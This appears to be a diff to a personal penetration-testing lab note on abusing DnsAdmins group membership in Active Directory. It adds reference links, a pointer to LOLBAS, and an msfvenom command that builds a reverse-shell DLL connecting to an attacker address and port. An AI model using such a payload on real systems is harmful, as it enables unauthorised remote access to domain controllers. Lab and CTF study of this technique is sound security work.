@@ -62,6 +62,16 @@ So the group that stands out is DnsAdmins
 
 https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
 
-```
+https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b
 
+Reverse DLL
 ```
+msfvenom -p windows/x64/shell_reverse_tcp -f dll -o rev.dll LHOST=10.10.16.20 LPORT=9999
+```
+![[Pasted image 20240506081507.png]]
+
+We have to use LOLbins
+https://lolbas-project.github.io/
+
+![[Pasted image 20240506081837.png]]
+
